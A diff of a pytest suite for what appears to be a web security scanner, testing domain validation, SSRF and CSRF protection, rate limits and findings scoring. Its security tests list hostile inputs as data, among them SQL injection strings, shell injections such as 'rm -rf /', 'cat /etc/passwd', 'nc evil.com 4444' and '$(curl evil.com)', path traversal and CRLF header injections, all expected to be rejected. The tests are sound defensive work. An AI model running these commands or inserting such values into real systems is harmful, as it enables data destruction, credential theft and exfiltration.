@@ -13,22 +13,21 @@ Tests with controlled/mock data — no network dependency:
 Run: cd app && python -m pytest tests/test_backend.py -v
 """
 
-import pytest
 from unittest.mock import patch
-from fastapi import HTTPException
 
-from validation import clean_domain, validate_domain, is_private_ip
+import pytest
+from config import DOMAIN_LIMIT, ERROR_MESSAGES, GRADE_COLORS
+from conftest import FakeRequest, make_scan_result
+from fastapi import HTTPException
+from findings import enrich_with_findings
+from findings import is_enterprise_domain as _is_enterprise_domain
+from ratelimit import check_domain_limit
+from validation import SCAN_ID_PATTERN, clean_domain, is_private_ip, validate_domain
 from validation import check_csrf as _check_csrf
 from validation import get_client_ip as _get_client_ip
-from validation import SCAN_ID_PATTERN
-from config import GRADE_COLORS, ALLOWED_ORIGINS, ERROR_MESSAGES, DOMAIN_LIMIT
-from ratelimit import check_domain_limit
-from findings import enrich_with_findings, is_enterprise_domain as _is_enterprise_domain
-
-from conftest import FakeRequest, make_scan_result
-
 
 # === Domain validation ===
+
 
 class TestCleanDomain:
     def test_strips_whitespace(self):
@@ -69,10 +68,19 @@ class TestCleanDomain:
 
 
 class TestPrivateIp:
-    @pytest.mark.parametrize("ip", [
-        "127.0.0.1", "10.0.0.1", "192.168.1.1", "172.16.0.1",
-        "169.254.1.1", "0.0.0.0", "::1", "255.255.255.255",
-    ])
+    @pytest.mark.parametrize(
+        "ip",
+        [
+            "127.0.0.1",
+            "10.0.0.1",
+            "192.168.1.1",
+            "172.16.0.1",
+            "169.254.1.1",
+            "0.0.0.0",
+            "::1",
+            "255.255.255.255",
+        ],
+    )
     def test_private_ips(self, ip):
         assert is_private_ip(ip) is True
 
@@ -88,6 +96,7 @@ class TestPrivateIp:
 
 
 # === Grade colors ===
+
 
 class TestGradeColors:
     def test_a_is_green(self):
@@ -110,6 +119,7 @@ class TestGradeColors:
 
 
 # === CSRF checking ===
+
 
 class TestCsrf:
     def test_allows_contrastcyber_origin(self):
@@ -148,6 +158,7 @@ class TestCsrf:
 
 # === Client IP extraction ===
 
+
 class TestClientIp:
     def test_x_real_ip_priority(self):
         req = FakeRequest(headers={"x-real-ip": "1.2.3.4"}, client_host="127.0.0.1")
@@ -158,10 +169,7 @@ class TestClientIp:
         assert _get_client_ip(req) == "5.6.7.8"
 
     def test_x_real_ip_over_x_forwarded_for(self):
-        req = FakeRequest(
-            headers={"x-real-ip": "1.2.3.4", "x-forwarded-for": "5.6.7.8"},
-            client_host="127.0.0.1"
-        )
+        req = FakeRequest(headers={"x-real-ip": "1.2.3.4", "x-forwarded-for": "5.6.7.8"}, client_host="127.0.0.1")
         assert _get_client_ip(req) == "1.2.3.4"
 
     def test_fallback_to_client_host(self):
@@ -172,8 +180,21 @@ class TestClientIp:
         req = FakeRequest(headers={"x-real-ip": "  1.2.3.4  "}, client_host="127.0.0.1")
         assert _get_client_ip(req) == "1.2.3.4"
 
+    def test_cf_connecting_ip_priority(self):
+        req = FakeRequest(headers={"cf-connecting-ip": "1.2.3.4"}, client_host="127.0.0.1")
+        assert _get_client_ip(req) == "1.2.3.4"
+
+    def test_cf_connecting_ip_over_x_real_ip(self):
+        req = FakeRequest(headers={"cf-connecting-ip": "1.2.3.4", "x-real-ip": "5.6.7.8"}, client_host="127.0.0.1")
+        assert _get_client_ip(req) == "1.2.3.4"
+
+    def test_cf_connecting_ip_invalid_falls_through(self):
+        req = FakeRequest(headers={"cf-connecting-ip": "garbage", "x-real-ip": "5.6.7.8"}, client_host="127.0.0.1")
+        assert _get_client_ip(req) == "5.6.7.8"
+
 
 # === Rate limiting ===
+
 
 class TestRateLimiting:
     def test_domain_limit_allows(self):
@@ -194,6 +215,7 @@ class TestRateLimiting:
 
 
 # === enrich_with_findings ===
+
 
 class TestEnrichPerfect:
     def test_findings_list_exists(self):
@@ -227,44 +249,59 @@ class TestEnrichPerfect:
 
 class TestEnrichMissingHeaders:
     def test_two_header_findings(self):
-        result = make_scan_result(headers_missing=[
-            "content-security-policy", "strict-transport-security",
-        ])
+        result = make_scan_result(
+            headers_missing=[
+                "content-security-policy",
+                "strict-transport-security",
+            ]
+        )
         enriched = enrich_with_findings(result)
         header_findings = [f for f in enriched["findings"] if f["category"] == "headers"]
         assert len(header_findings) == 2
 
     def test_csp_finding_present(self):
-        result = make_scan_result(headers_missing=[
-            "content-security-policy", "strict-transport-security",
-        ])
+        result = make_scan_result(
+            headers_missing=[
+                "content-security-policy",
+                "strict-transport-security",
+            ]
+        )
         enriched = enrich_with_findings(result)
         header_findings = [f for f in enriched["findings"] if f["category"] == "headers"]
         csp = [f for f in header_findings if f.get("header") == "content-security-policy"]
         assert len(csp) == 1
 
     def test_csp_severity_high(self):
-        result = make_scan_result(headers_missing=[
-            "content-security-policy", "strict-transport-security",
-        ])
+        result = make_scan_result(
+            headers_missing=[
+                "content-security-policy",
+                "strict-transport-security",
+            ]
+        )
         enriched = enrich_with_findings(result)
         header_findings = [f for f in enriched["findings"] if f["category"] == "headers"]
         csp = [f for f in header_findings if f.get("header") == "content-security-policy"]
         assert csp[0]["severity"] == "high"
 
     def test_hsts_finding_present(self):
-        result = make_scan_result(headers_missing=[
-            "content-security-policy", "strict-transport-security",
-        ])
+        result = make_scan_result(
+            headers_missing=[
+                "content-security-policy",
+                "strict-transport-security",
+            ]
+        )
         enriched = enrich_with_findings(result)
         header_findings = [f for f in enriched["findings"] if f["category"] == "headers"]
         hsts = [f for f in header_findings if f.get("header") == "strict-transport-security"]
         assert len(hsts) == 1
 
     def test_hsts_severity_high(self):
-        result = make_scan_result(headers_missing=[
-            "content-security-policy", "strict-transport-security",
-        ])
+        result = make_scan_result(
+            headers_missing=[
+                "content-security-policy",
+                "strict-transport-security",
+            ]
+        )
         enriched = enrich_with_findings(result)
         header_findings = [f for f in enriched["findings"] if f["category"] == "headers"]
         hsts = [f for f in header_findings if f.get("header") == "strict-transport-security"]
@@ -273,43 +310,63 @@ class TestEnrichMissingHeaders:
 
 class TestEnrichAllHeadersMissing:
     def test_six_header_findings(self):
-        result = make_scan_result(headers_missing=[
-            "content-security-policy", "strict-transport-security",
-            "x-content-type-options", "x-frame-options",
-            "referrer-policy", "permissions-policy",
-        ])
+        result = make_scan_result(
+            headers_missing=[
+                "content-security-policy",
+                "strict-transport-security",
+                "x-content-type-options",
+                "x-frame-options",
+                "referrer-policy",
+                "permissions-policy",
+            ]
+        )
         enriched = enrich_with_findings(result)
         header_findings = [f for f in enriched["findings"] if f["category"] == "headers"]
         assert len(header_findings) == 6
 
     def test_two_high_severity_headers(self):
-        result = make_scan_result(headers_missing=[
-            "content-security-policy", "strict-transport-security",
-            "x-content-type-options", "x-frame-options",
-            "referrer-policy", "permissions-policy",
-        ])
+        result = make_scan_result(
+            headers_missing=[
+                "content-security-policy",
+                "strict-transport-security",
+                "x-content-type-options",
+                "x-frame-options",
+                "referrer-policy",
+                "permissions-policy",
+            ]
+        )
         enriched = enrich_with_findings(result)
         header_findings = [f for f in enriched["findings"] if f["category"] == "headers"]
         severities = [f["severity"] for f in header_findings]
         assert severities.count("high") == 2
 
     def test_two_medium_severity_headers(self):
-        result = make_scan_result(headers_missing=[
-            "content-security-policy", "strict-transport-security",
-            "x-content-type-options", "x-frame-options",
-            "referrer-policy", "permissions-policy",
-        ])
+        result = make_scan_result(
+            headers_missing=[
+                "content-security-policy",
+                "strict-transport-security",
+                "x-content-type-options",
+                "x-frame-options",
+                "referrer-policy",
+                "permissions-policy",
+            ]
+        )
         enriched = enrich_with_findings(result)
         header_findings = [f for f in enriched["findings"] if f["category"] == "headers"]
         severities = [f["severity"] for f in header_findings]
         assert severities.count("medium") == 2
 
     def test_two_low_severity_headers(self):
-        result = make_scan_result(headers_missing=[
-            "content-security-policy", "strict-transport-security",
-            "x-content-type-options", "x-frame-options",
-            "referrer-policy", "permissions-policy",
-        ])
+        result = make_scan_result(
+            headers_missing=[
+                "content-security-policy",
+                "strict-transport-security",
+                "x-content-type-options",
+                "x-frame-options",
+                "referrer-policy",
+                "permissions-policy",
+            ]
+        )
         enriched = enrich_with_findings(result)
         header_findings = [f for f in enriched["findings"] if f["category"] == "headers"]
         severities = [f["severity"] for f in header_findings]
@@ -511,8 +568,7 @@ class TestEnrichNoRedirect:
 class TestEnrichDisclosure:
     def test_powered_by_finding_present(self):
         result = make_scan_result(
-            powered_by_exposed=True, powered_by_value="Express",
-            server_exposed=True, server_value="nginx"
+            powered_by_exposed=True, powered_by_value="Express", server_exposed=True, server_value="nginx"
         )
         enriched = enrich_with_findings(result)
         disc_findings = [f for f in enriched["findings"] if f["category"] == "disclosure"]
@@ -520,8 +576,7 @@ class TestEnrichDisclosure:
 
     def test_powered_by_medium(self):
         result = make_scan_result(
-            powered_by_exposed=True, powered_by_value="Express",
-            server_exposed=True, server_value="nginx"
+            powered_by_exposed=True, powered_by_value="Express", server_exposed=True, server_value="nginx"
         )
         enriched = enrich_with_findings(result)
         disc_findings = [f for f in enriched["findings"] if f["category"] == "disclosure"]
@@ -529,8 +584,7 @@ class TestEnrichDisclosure:
 
     def test_description_mentions_express(self):
         result = make_scan_result(
-            powered_by_exposed=True, powered_by_value="Express",
-            server_exposed=True, server_value="nginx"
+            powered_by_exposed=True, powered_by_value="Express", server_exposed=True, server_value="nginx"
         )
         enriched = enrich_with_findings(result)
         disc_findings = [f for f in enriched["findings"] if f["category"] == "disclosure"]
@@ -557,41 +611,31 @@ class TestEnrichDisclosure:
 
 class TestEnrichCookies:
     def test_cookie_finding_present(self):
-        result = make_scan_result(
-            cookies_found=2, all_secure=False, all_httponly=True, all_samesite=False
-        )
+        result = make_scan_result(cookies_found=2, all_secure=False, all_httponly=True, all_samesite=False)
         enriched = enrich_with_findings(result)
         cookie_findings = [f for f in enriched["findings"] if f["category"] == "cookies"]
         assert len(cookie_findings) == 1
 
     def test_cookie_medium(self):
-        result = make_scan_result(
-            cookies_found=2, all_secure=False, all_httponly=True, all_samesite=False
-        )
+        result = make_scan_result(cookies_found=2, all_secure=False, all_httponly=True, all_samesite=False)
         enriched = enrich_with_findings(result)
         cookie_findings = [f for f in enriched["findings"] if f["category"] == "cookies"]
         assert cookie_findings[0]["severity"] == "medium"
 
     def test_mentions_secure(self):
-        result = make_scan_result(
-            cookies_found=2, all_secure=False, all_httponly=True, all_samesite=False
-        )
+        result = make_scan_result(cookies_found=2, all_secure=False, all_httponly=True, all_samesite=False)
         enriched = enrich_with_findings(result)
         cookie_findings = [f for f in enriched["findings"] if f["category"] == "cookies"]
         assert "Secure" in cookie_findings[0]["description"]
 
     def test_mentions_samesite(self):
-        result = make_scan_result(
-            cookies_found=2, all_secure=False, all_httponly=True, all_samesite=False
-        )
+        result = make_scan_result(cookies_found=2, all_secure=False, all_httponly=True, all_samesite=False)
         enriched = enrich_with_findings(result)
         cookie_findings = [f for f in enriched["findings"] if f["category"] == "cookies"]
         assert "SameSite" in cookie_findings[0]["description"]
 
     def test_does_not_mention_httponly(self):
-        result = make_scan_result(
-            cookies_found=2, all_secure=False, all_httponly=True, all_samesite=False
-        )
+        result = make_scan_result(cookies_found=2, all_secure=False, all_httponly=True, all_samesite=False)
         enriched = enrich_with_findings(result)
         cookie_findings = [f for f in enriched["findings"] if f["category"] == "cookies"]
         assert "HttpOnly" not in cookie_findings[0]["description"]
@@ -693,7 +737,19 @@ class TestEnrichCors:
         assert len(cred) >= 1
         assert cred[0]["severity"] == "critical"
 
-    def test_reflects_origin_high(self):
+    def test_reflects_origin_with_credentials_critical(self):
+        result = make_scan_result(reflects_origin=True, cors_credentials=True)
+        enriched = enrich_with_findings(result)
+        cors_findings = [f for f in enriched["findings"] if f["category"] == "cors"]
+        cred_reflect = [
+            f
+            for f in cors_findings
+            if "reflects" in f["description"].lower() and "credential" in f["description"].lower()
+        ]
+        assert len(cred_reflect) == 1
+        assert cred_reflect[0]["severity"] == "critical"
+
+    def test_reflects_origin_without_credentials_high(self):
         result = make_scan_result(reflects_origin=True)
         enriched = enrich_with_findings(result)
         cors_findings = [f for f in enriched["findings"] if f["category"] == "cors"]
@@ -717,10 +773,11 @@ class TestEnrichCors:
 
     def test_all_cors_issues_three_findings(self):
         result = make_scan_result(
-            wildcard_origin=True, reflects_origin=True, credentials_with_wildcard=True
+            wildcard_origin=True, reflects_origin=True, credentials_with_wildcard=True, cors_credentials=True
         )
         enriched = enrich_with_findings(result)
         cors_findings = [f for f in enriched["findings"] if f["category"] == "cors"]
+        # credentials_with_wildcard=critical, reflects+credentials=critical (if/else), wildcard=medium
         assert len(cors_findings) == 3
 
 
@@ -803,9 +860,13 @@ class TestEnrichHtml:
 
     def test_all_html_issues_many_findings(self):
         result = make_scan_result(
-            mixed_active=1, mixed_passive=1, inline_handlers=2,
-            external_scripts_no_sri=3, forms_http_action=1,
-            meta_set_cookie=1, meta_refresh_http=1,
+            mixed_active=1,
+            mixed_passive=1,
+            inline_handlers=2,
+            external_scripts_no_sri=3,
+            forms_http_action=1,
+            meta_set_cookie=1,
+            meta_refresh_http=1,
         )
         enriched = enrich_with_findings(result)
         html_findings = [f for f in enriched["findings"] if f["category"] == "html"]
@@ -853,8 +914,10 @@ class TestEnrichCspDeep:
 
     def test_all_csp_issues_four_findings(self):
         result = make_scan_result(
-            unsafe_inline=True, unsafe_eval=True,
-            wildcard_source=True, data_uri=True,
+            unsafe_inline=True,
+            unsafe_eval=True,
+            wildcard_source=True,
+            data_uri=True,
         )
         enriched = enrich_with_findings(result)
         csp_findings = [f for f in enriched["findings"] if f["category"] == "csp_analysis"]
@@ -881,8 +944,7 @@ class TestEnrichSeverityOrder:
         findings = enriched["findings"]
         severities = [f["severity"] for f in findings]
         order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
-        is_sorted = all(order[severities[i]] <= order[severities[i+1]]
-                        for i in range(len(severities) - 1))
+        is_sorted = all(order[severities[i]] <= order[severities[i + 1]] for i in range(len(severities) - 1))
         assert is_sorted
 
     def test_first_finding_is_critical(self):
@@ -902,16 +964,26 @@ class TestEnrichWorstCase:
     def setup_worst_case(self):
         result = make_scan_result(
             headers_missing=[
-                "content-security-policy", "strict-transport-security",
-                "x-content-type-options", "x-frame-options",
-                "referrer-policy", "permissions-policy",
+                "content-security-policy",
+                "strict-transport-security",
+                "x-content-type-options",
+                "x-frame-options",
+                "referrer-policy",
+                "permissions-policy",
             ],
             ssl_error="TLS handshake failed: certificate verify failed",
-            spf=False, dmarc=False, dkim=False,
+            spf=False,
+            dmarc=False,
+            dkim=False,
             redirects_to_https=False,
-            powered_by_exposed=True, powered_by_value="PHP/7.4",
-            server_exposed=True, server_value="Apache/2.4.41",
-            cookies_found=3, all_secure=False, all_httponly=False, all_samesite=False,
+            powered_by_exposed=True,
+            powered_by_value="PHP/7.4",
+            server_exposed=True,
+            server_value="Apache/2.4.41",
+            cookies_found=3,
+            all_secure=False,
+            all_httponly=False,
+            all_samesite=False,
             dnssec_enabled=False,
         )
         self.enriched = enrich_with_findings(result)
@@ -935,10 +1007,7 @@ class TestEnrichWorstCase:
 
     def test_all_findings_have_required_fields(self):
         required_fields = ["category", "severity", "attack_vector", "description", "remediation"]
-        assert all(
-            all(field in f for field in required_fields)
-            for f in self.findings
-        )
+        assert all(all(field in f for field in required_fields) for f in self.findings)
 
     def test_no_empty_descriptions(self):
         assert all(f["description"] for f in self.findings)
@@ -948,6 +1017,7 @@ class TestEnrichWorstCase:
 
 
 # === Scan ID validation ===
+
 
 class TestScanIdPattern:
     def test_valid_32_char_hex(self):
@@ -980,6 +1050,7 @@ class TestScanIdPattern:
 
 # === Error messages ===
 
+
 class TestErrorMessages:
     @pytest.mark.parametrize("code", [400, 403, 404, 429, 500, 502, 503, 504])
     def test_error_code_defined(self, code):
@@ -987,36 +1058,46 @@ class TestErrorMessages:
 
     @pytest.mark.parametrize("code", [400, 403, 404, 429, 500, 502, 503, 504])
     def test_error_code_has_title(self, code):
-        title, msg = ERROR_MESSAGES[code]
+        title, _msg = ERROR_MESSAGES[code]
         assert len(title) > 0
 
     @pytest.mark.parametrize("code", [400, 403, 404, 429, 500, 502, 503, 504])
     def test_error_code_has_message(self, code):
-        title, msg = ERROR_MESSAGES[code]
+        _title, msg = ERROR_MESSAGES[code]
         assert len(msg) > 0
 
 
 # === Enterprise detection ===
 
+
 class TestEnterpriseDetection:
-    @pytest.mark.parametrize("domain,expected", [
-        ("google.com", "Google"),
-        ("www.google.com", "Google"),
-        ("mail.google.com", "Google"),
-        ("facebook.com", "Facebook"),
-        ("github.com", "Github"),
-        ("microsoft.com", "Microsoft"),
-        ("amazon.com", "Amazon"),
-        ("netflix.com", "Netflix"),
-        ("x.com", "X"),
-    ])
+    @pytest.mark.parametrize(
+        "domain,expected",
+        [
+            ("google.com", "Google"),
+            ("www.google.com", "Google"),
+            ("mail.google.com", "Google"),
+            ("facebook.com", "Facebook"),
+            ("github.com", "Github"),
+            ("microsoft.com", "Microsoft"),
+            ("amazon.com", "Amazon"),
+            ("netflix.com", "Netflix"),
+            ("x.com", "X"),
+        ],
+    )
     def test_enterprise_domains(self, domain, expected):
         assert _is_enterprise_domain(domain) == expected
 
-    @pytest.mark.parametrize("domain", [
-        "contrastcyber.com", "example.com", "mygoogle.com",
-        "google.com.evil.com", "",
-    ])
+    @pytest.mark.parametrize(
+        "domain",
+        [
+            "contrastcyber.com",
+            "example.com",
+            "mygoogle.com",
+            "google.com.evil.com",
+            "",
+        ],
+    )
     def test_non_enterprise_domains(self, domain):
         assert _is_enterprise_domain(domain) is None
 
@@ -1055,31 +1136,40 @@ class TestEnrichEnterprise:
 
 # === SECURITY: SSRF Protection ===
 
+
 class TestSsrfProtection:
     """Verify private/reserved IPs are blocked to prevent SSRF."""
 
-    @pytest.mark.parametrize("ip", [
-        "127.0.0.1", "127.0.0.2", "127.255.255.255",  # loopback range
-        "10.0.0.1", "10.255.255.255",                   # RFC1918 class A
-        "172.16.0.1", "172.31.255.255",                  # RFC1918 class B
-        "192.168.0.1", "192.168.255.255",                # RFC1918 class C
-        "169.254.169.254",                               # AWS metadata
-        "169.254.0.1",                                   # link-local
-        "0.0.0.0",                                       # unspecified
-        "::1",                                           # IPv6 loopback
-        "::ffff:127.0.0.1",                              # IPv4-mapped IPv6
-        "::ffff:10.0.0.1",                               # IPv4-mapped private
-        "::ffff:169.254.169.254",                        # IPv4-mapped metadata
-        "fe80::1",                                       # IPv6 link-local
-        "fc00::1",                                       # IPv6 ULA
-        "fd00::1",                                       # IPv6 ULA
-        "100.64.0.1",                                    # shared address space
-        "198.51.100.1",                                  # TEST-NET-2
-        "203.0.113.1",                                   # TEST-NET-3
-        "224.0.0.1",                                     # multicast
-        "240.0.0.1",                                     # reserved
-        "255.255.255.255",                               # broadcast
-    ])
+    @pytest.mark.parametrize(
+        "ip",
+        [
+            "127.0.0.1",
+            "127.0.0.2",
+            "127.255.255.255",  # loopback range
+            "10.0.0.1",
+            "10.255.255.255",  # RFC1918 class A
+            "172.16.0.1",
+            "172.31.255.255",  # RFC1918 class B
+            "192.168.0.1",
+            "192.168.255.255",  # RFC1918 class C
+            "169.254.169.254",  # AWS metadata
+            "169.254.0.1",  # link-local
+            "0.0.0.0",  # unspecified
+            "::1",  # IPv6 loopback
+            "::ffff:127.0.0.1",  # IPv4-mapped IPv6
+            "::ffff:10.0.0.1",  # IPv4-mapped private
+            "::ffff:169.254.169.254",  # IPv4-mapped metadata
+            "fe80::1",  # IPv6 link-local
+            "fc00::1",  # IPv6 ULA
+            "fd00::1",  # IPv6 ULA
+            "100.64.0.1",  # shared address space
+            "198.51.100.1",  # TEST-NET-2
+            "203.0.113.1",  # TEST-NET-3
+            "224.0.0.1",  # multicast
+            "240.0.0.1",  # reserved
+            "255.255.255.255",  # broadcast
+        ],
+    )
     def test_private_reserved_ip_blocked(self, ip):
         assert is_private_ip(ip) is True
 
@@ -1098,6 +1188,7 @@ class TestSsrfProtection:
 
 
 # === SECURITY: Input Sanitization ===
+
 
 class TestInputSanitization:
     """Verify null bytes, unicode tricks, path traversal stripped/blocked."""
@@ -1188,24 +1279,29 @@ class TestInputSanitization:
 
 # === SECURITY: SQL Injection Resistance ===
 
+
 class TestSqlInjection:
     """Verify SQL injection payloads don't pass domain validation."""
 
-    @pytest.mark.parametrize("payload", [
-        "' OR 1=1 --",
-        "'; DROP TABLE scans; --",
-        "1' UNION SELECT * FROM scans --",
-        "example.com' AND '1'='1",
-        "' OR ''='",
-        "1; SELECT * FROM api_keys --",
-        "example.com\"; DROP TABLE scans; --",
-    ])
+    @pytest.mark.parametrize(
+        "payload",
+        [
+            "' OR 1=1 --",
+            "'; DROP TABLE scans; --",
+            "1' UNION SELECT * FROM scans --",
+            "example.com' AND '1'='1",
+            "' OR ''='",
+            "1; SELECT * FROM api_keys --",
+            'example.com"; DROP TABLE scans; --',
+        ],
+    )
     def test_sqli_payload_blocked_by_validation(self, payload):
         result = validate_domain(clean_domain(payload))
         assert result is None
 
 
 # === SECURITY: CSRF Edge Cases ===
+
 
 class TestCsrfEdgeCases:
     """Additional CSRF scenarios beyond basic origin check."""
@@ -1248,18 +1344,22 @@ class TestCsrfEdgeCases:
 
 # === SECURITY: Command Injection Prevention ===
 
+
 class TestCommandInjection:
     """Verify shell metacharacters can't reach subprocess.run."""
 
-    @pytest.mark.parametrize("payload", [
-        "example.com; rm -rf /",
-        "example.com && cat /etc/passwd",
-        "example.com | nc evil.com 4444",
-        "$(curl evil.com)",
-        "`wget evil.com`",
-        "example.com\n; ls",
-        "example.com$(id)",
-    ])
+    @pytest.mark.parametrize(
+        "payload",
+        [
+            "example.com; rm -rf /",
+            "example.com && cat /etc/passwd",
+            "example.com | nc evil.com 4444",
+            "$(curl evil.com)",
+            "`wget evil.com`",
+            "example.com\n; ls",
+            "example.com$(id)",
+        ],
+    )
     def test_shell_metachar_blocked_by_validation(self, payload):
         result = validate_domain(clean_domain(payload))
         assert result is None
@@ -1267,22 +1367,26 @@ class TestCommandInjection:
 
 # === SECURITY: Scan ID / Report Path Traversal ===
 
+
 class TestScanIdValidation:
     """Verify scan_id regex prevents path traversal."""
 
-    @pytest.mark.parametrize("bad_id", [
-        "../../../etc/passwd",
-        "..%2f..%2f..%2fetc%2fpasswd",
-        "aaaaaaaaaaaaaaaa/../../../etc/passwd",
-        "a" * 31,        # too short
-        "a" * 33,        # too long
-        "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD",  # uppercase hex
-        "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz",  # non-hex
-        "",
-        " " * 32,
-        "a" * 16 + "\x00" + "b" * 15,
-        "../" * 10 + "a" * 2,
-    ])
+    @pytest.mark.parametrize(
+        "bad_id",
+        [
+            "../../../etc/passwd",
+            "..%2f..%2f..%2fetc%2fpasswd",
+            "aaaaaaaaaaaaaaaa/../../../etc/passwd",
+            "a" * 31,  # too short
+            "a" * 33,  # too long
+            "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD",  # uppercase hex
+            "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz",  # non-hex
+            "",
+            " " * 32,
+            "a" * 16 + "\x00" + "b" * 15,
+            "../" * 10 + "a" * 2,
+        ],
+    )
     def test_invalid_scan_id_rejected(self, bad_id):
         assert SCAN_ID_PATTERN.match(bad_id) is None
 
@@ -1293,16 +1397,20 @@ class TestScanIdValidation:
 
 # === SECURITY: Header Injection (CRLF) ===
 
+
 class TestHeaderInjection:
     """CRLF in domain must not inject HTTP headers."""
 
-    @pytest.mark.parametrize("payload", [
-        "example.com\r\nX-Injected: true",
-        "example.com\r\nSet-Cookie: evil=1",
-        "example.com\r\n\r\n<html>injected</html>",
-        "example.com%0d%0aX-Injected: true",
-        "example.com\nHost: evil.com",
-    ])
+    @pytest.mark.parametrize(
+        "payload",
+        [
+            "example.com\r\nX-Injected: true",
+            "example.com\r\nSet-Cookie: evil=1",
+            "example.com\r\n\r\n<html>injected</html>",
+            "example.com%0d%0aX-Injected: true",
+            "example.com\nHost: evil.com",
+        ],
+    )
     def test_crlf_blocked_by_validation(self, payload):
         result = validate_domain(clean_domain(payload))
         assert result is None
@@ -1315,7 +1423,7 @@ class TestHeaderInjection:
         ]:
             cleaned = clean_domain(payload)
             result = validate_domain(cleaned)
-            assert result is None, f"CRLF payload passed validation: {repr(payload)}"
+            assert result is None, f"CRLF payload passed validation: {payload!r}"
 
     def test_crlf_prefix_stripped_by_clean(self):
         """Leading CRLF is stripped by clean_domain (whitespace strip), domain resolves normally."""
@@ -1325,39 +1433,69 @@ class TestHeaderInjection:
 
 # === SECURITY: Integer Overflow in Scores ===
 
+
 class TestIntegerOverflow:
     """Score calculations should handle edge values without overflow."""
 
     def test_max_score_sum_within_bounds(self):
         result = make_scan_result()
         total = 0
-        for module in ["headers", "ssl", "dns", "redirect", "disclosure",
-                       "cookies", "dnssec", "methods", "cors", "html", "csp_analysis"]:
+        for module in [
+            "headers",
+            "ssl",
+            "dns",
+            "redirect",
+            "disclosure",
+            "cookies",
+            "dnssec",
+            "methods",
+            "cors",
+            "html",
+            "csp_analysis",
+        ]:
             total += result[module]["score"]
         assert 0 <= total <= 200  # reasonable upper bound
 
     def test_all_zeros_no_negative(self):
         result = make_scan_result(
-            headers_missing=["content-security-policy", "strict-transport-security",
-                             "x-content-type-options", "x-frame-options",
-                             "referrer-policy", "permissions-policy"],
+            headers_missing=[
+                "content-security-policy",
+                "strict-transport-security",
+                "x-content-type-options",
+                "x-frame-options",
+                "referrer-policy",
+                "permissions-policy",
+            ],
             ssl_error="connection failed",
-            spf=False, dmarc=False, dkim=False,
+            spf=False,
+            dmarc=False,
+            dkim=False,
             redirects_to_https=False,
             dnssec_enabled=False,
         )
-        for module in ["headers", "ssl", "dns", "redirect", "disclosure",
-                       "cookies", "dnssec"]:
+        for module in ["headers", "ssl", "dns", "redirect", "disclosure", "cookies", "dnssec"]:
             assert result[module]["score"] >= 0
 
     def test_score_never_exceeds_max(self):
         result = make_scan_result()
-        for module in ["headers", "ssl", "dns", "redirect", "disclosure",
-                       "cookies", "dnssec", "methods", "cors", "html", "csp_analysis"]:
+        for module in [
+            "headers",
+            "ssl",
+            "dns",
+            "redirect",
+            "disclosure",
+            "cookies",
+            "dnssec",
+            "methods",
+            "cors",
+            "html",
+            "csp_analysis",
+        ]:
             assert result[module]["score"] <= result[module]["max"]
 
 
 # === SECURITY: Client IP Spoofing Resistance ===
+
 
 class TestClientIpSpoofing:
     """Verify invalid IPs in headers don't crash or mislead."""
@@ -1383,6 +1521,7 @@ class TestClientIpSpoofing:
 
 # === Security Test 1 — IP Spoofing via X-Real-IP/X-Forwarded-For ===
 
+
 class TestIpSpoofingRateLimitBypass:
     """CRITICAL: Verify that spoofed IP headers cannot bypass rate limits.
     Security test: attacker rotates X-Real-IP to get unlimited scans."""
@@ -1394,10 +1533,7 @@ class TestIpSpoofingRateLimitBypass:
 
     def test_x_forwarded_for_first_ip_only(self):
         """Verify only the first IP from X-Forwarded-For is used (not attacker-appended ones)."""
-        req = FakeRequest(
-            headers={"x-forwarded-for": "1.2.3.4, 5.5.5.5, 6.6.6.6"},
-            client_host="127.0.0.1"
-        )
+        req = FakeRequest(headers={"x-forwarded-for": "1.2.3.4, 5.5.5.5, 6.6.6.6"}, client_host="127.0.0.1")
         assert _get_client_ip(req) == "1.2.3.4"
 
     def test_private_ip_in_x_real_ip_still_accepted(self):
@@ -1408,6 +1544,7 @@ class TestIpSpoofingRateLimitBypass:
 
 
 # === Security Test 2 — CSRF Bypass when Origin AND Referer absent ===
+
 
 class TestCsrfBypassNoHeaders:
     """FIXED: When both Origin and Referer are absent, CSRF check now blocks."""
@@ -1455,20 +1592,31 @@ class TestCsrfBypassNoHeaders:
 
 # === Security Test 3 — Recon SSRF private IP resolution ===
 
+
 class TestReconSsrfPrivateIp:
     """HIGH: Subdomain enumeration must not resolve to private IPs and leak them.
     Validates that resolve_and_check blocks private IP resolution."""
 
-    @pytest.mark.parametrize("ip", [
-        "127.0.0.1", "10.0.0.1", "172.16.0.1", "192.168.1.1",
-        "169.254.169.254", "0.0.0.0", "::1", "fe80::1",
-    ])
+    @pytest.mark.parametrize(
+        "ip",
+        [
+            "127.0.0.1",
+            "10.0.0.1",
+            "172.16.0.1",
+            "192.168.1.1",
+            "169.254.169.254",
+            "0.0.0.0",
+            "::1",
+            "fe80::1",
+        ],
+    )
     def test_private_ip_flagged(self, ip):
         assert is_private_ip(ip) is True
 
     def test_resolve_and_check_returns_none_for_localhost(self):
         """localhost resolves to 127.0.0.1 — must return None (SSRF blocked)."""
         from validation import resolve_and_check
+
         result = resolve_and_check("localhost")
         assert result is None
 
@@ -1489,6 +1637,7 @@ class TestReconSsrfPrivateIp:
 
 # === Security Test 7 — Zone Transfer NS Validation ===
 
+
 class TestZoneTransferNsValidation:
     """MEDIUM: Nameserver values from dig output are passed to subprocess.
     Verify that recon.check_zone_transfer handles malicious NS responses safely."""
@@ -1496,17 +1645,20 @@ class TestZoneTransferNsValidation:
     def test_zone_transfer_returns_dict(self):
         """Basic structure check — function always returns a dict."""
         from recon import check_zone_transfer
+
         result = check_zone_transfer("nonexistent-domain-xyz123.com")
         assert isinstance(result, dict)
         assert "vulnerable" in result
 
     def test_zone_transfer_nonexistent_not_vulnerable(self):
         from recon import check_zone_transfer
+
         result = check_zone_transfer("nonexistent-domain-xyz123.com")
         assert result["vulnerable"] is False
 
 
 # === Security Test 8 — crt.sh Query Not URL-Encoded ===
+
 
 class TestCrtshUrlEncoding:
     """MEDIUM: crt.sh query parameter is not URL-encoded, allowing injection.
@@ -1516,14 +1668,14 @@ class TestCrtshUrlEncoding:
         """Verify the URL is built with the domain directly."""
         # The _fetch_crtsh function builds: f"https://crt.sh/?q={query}&output=json"
         # With special chars this could break the URL
-        from urllib.parse import quote
